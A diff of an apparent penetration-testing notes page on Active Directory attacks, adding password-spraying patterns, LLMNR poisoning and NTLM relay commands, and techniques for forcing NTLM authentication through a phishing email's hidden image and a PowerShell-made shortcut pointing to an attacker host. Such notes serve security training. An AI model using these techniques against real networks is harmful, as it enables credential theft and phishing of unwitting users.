@@ -10,13 +10,13 @@
 <meta name="generator" content="Jekyll v3.8.4" />
 <meta property="og:title" content="AD Attacks" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Without Credentials" />
-<meta property="og:description" content="Without Credentials" />
+<meta name="description" content="Password Spraying" />
+<meta property="og:description" content="Password Spraying" />
 <link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/active-directory/ad-attacks/" />
 <meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/active-directory/ad-attacks/" />
 <meta property="og:site_name" content="Hacking Notes" />
 <script type="application/ld+json">
-{"description":"Without Credentials","url":"http://0.0.0.0:4000/hackingnotes/active-directory/ad-attacks/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"AD Attacks","@context":"http://schema.org"}</script>
+{"description":"Password Spraying","url":"http://0.0.0.0:4000/hackingnotes/active-directory/ad-attacks/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"AD Attacks","@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
@@ -56,8 +56,10 @@
 					
 						<li class="nav-item top-level current">
 							
-							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
+							<a href="/hackingnotes/active-directory/introduction/">Active Directory</a>
 							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/introduction/">Basics</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
 								
@@ -70,6 +72,10 @@
 									<li class="nav-item "><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-certificate-services/">Active Directory Certificate Services</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/securing-ad/">Hardening Active Directory</a></li>
 								
 									<li class="nav-item current"><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
 								
@@ -84,6 +90,8 @@
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/html-application/">HTML Application (HTA)</a></li>
 								
 							</ul>
 						</li>
@@ -112,6 +120,8 @@
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/bof-linux/">Linux BoF 32bit</a></li>
 								
 							</ul>
 						</li>
@@ -163,6 +173,10 @@
 								
 									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
 								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/ata-evasion/">ATA Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-applocker/">Bypass APPLocker</a></li>
+								
 							</ul>
 						</li>
 					
@@ -192,10 +206,52 @@
 					
 						<li class="nav-item top-level ">
 							
+							<a href="/hackingnotes/red-team/introduction/">Red Team</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/introduction/">Introduction</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/opsec-infrastructure/">OPSEC Infrastructure</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/c2-cobaltstrike/">C2 - Cobalt Strike</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-reconnaissance/">Host Reconnaissance</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-persistence/">Host Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-privilege-escalation/">Host Privilege Escalation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/lateral-movement/">Lateral Movement</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/credentials-and-user-impersonation/">Credentials & User Impersonation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/kibana/">Kibana - The Security App</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/pivoting/">Pivoting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/ms-sql-servers/">MS SQL Servers</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/data-protection-api/">Data Protection API (DPAPI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/laps/">Local Administrator Password Solution (LAPS)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/microsoft-defender/">Microsoft Defender Antivirus</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/application-whitelisting/">Application Whitelisting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/exfiltration/">Exfiltration</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
 							<a href="/hackingnotes/services/ftp/">Services</a>
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ssh/">PORT 22/tcp - SSH</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
 								
@@ -239,6 +295,8 @@
 								
 									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
 								
+									<li class="nav-item "><a href="/hackingnotes/software/owa-exchange/">OWA Exchange</a></li>
+								
 							</ul>
 						</li>
 					
@@ -281,9 +339,13 @@
 				<h3>AD Attacks</h3>
 			</div>
 			<article class="content">
-				<h1 id="without-credentials">Without Credentials</h1>
+				<h1 id="password-spraying">Password Spraying</h1>
 
-<h2 id="llmnr--netbios-poisoning">LLMNR / NetBIOS Poisoning</h2>
+<p>Password spraying is an effective technique for discovering weak passwords that users are notorious for using. Patterns such as MonthYear (August2022), SeasonYear (Summer2022) and DayDate (Tuesday6) are very common.</p>
+
+<p>Another pattern too common is the name of the company and the year (Corp2022)</p>
+
+<h1 id="llmnr--netbios-poisoning">LLMNR / NetBIOS Poisoning</h1>
 
 <p>We can grab some hashed credentials if LLMNR protocol is enabled.</p>
 
@@ -296,11 +358,11 @@
 sudo python DumpHash.py
 </code></pre></div></div>
 
-<h2 id="ntlm-relay-smb-signing-disabled">NTLM Relay (SMB signing disabled)</h2>
+<h1 id="ntlm-relay-smb-signing-disabled">NTLM Relay (SMB signing disabled)</h1>
 
 <p>Some tiems some server are misconfigured and have the smb signing disabled, so we can perform more attacks with responder.</p>
 
-<h3 id="configuration">Configuration</h3>
+<h2 id="configuration">Configuration</h2>
 
 <ul>
   <li>/etc/proxychains4.conf</li>
@@ -320,7 +382,7 @@ SMB = Off
 HTTP = On
 </code></pre></div></div>
 
-<h3 id="perform-the-attack">Perform the attack</h3>
+<h2 id="perform-the-attack">Perform the attack</h2>
 
 <p>We need to get a list of the servers with the SMB sigining disabled.</p>
 
@@ -342,6 +404,34 @@ sudo responder -I eth0
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains impacket-secretdump DOMAIN/admin@IP
 </code></pre></div></div>
+
+<h1 id="forcing-ntlm-authentication">Forcing NTLM Authentication</h1>
+
+<p>You can try to socially engineer a privilege user to authenticate to you.</p>
+
+<h2 id="1x1-images-in-emails">1x1 Images in Emails</h2>
+
+<p>You can send an invisible 1x1 pixel image embedded on a body of a phishing email. When the recipient view the email in their mail client, such as Outlook, it will attempt to download the image and will trigger an NTLM authentication attemp.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img src="\\&lt;attacker-ip&gt;\image.png" height="1" width="1" /&gt;
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>: Modify the email signature of a user, so when they send legitimate emails they will trigger NTLM authentication.</p>
+</blockquote>
+
+<h2 id="windows-shortcuts">Windows Shortcuts</h2>
+
+<p>A windows shortcut can have multiple properties such as directory and an icon.</p>
+
+<p>We can create a icon property pointing to a UNC path and will trigger an NTLM authentication attempt when it’s viewed in Explorer even if it doesn’t have been clicked.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$wsh = new-object -ComObject wscript.shell
+$shortcut = $wsh.CreateShortcut("\\smbsrv01\software\test.lnk")
+$shortcut.IconLocation = "\\&lt;attacker-ip&gt;\test.ico"
+$shortcut.Save()
+</code></pre></div></div>
+<p>A good location would be public readable shares.</p>
 
 			</article>
 		</section>
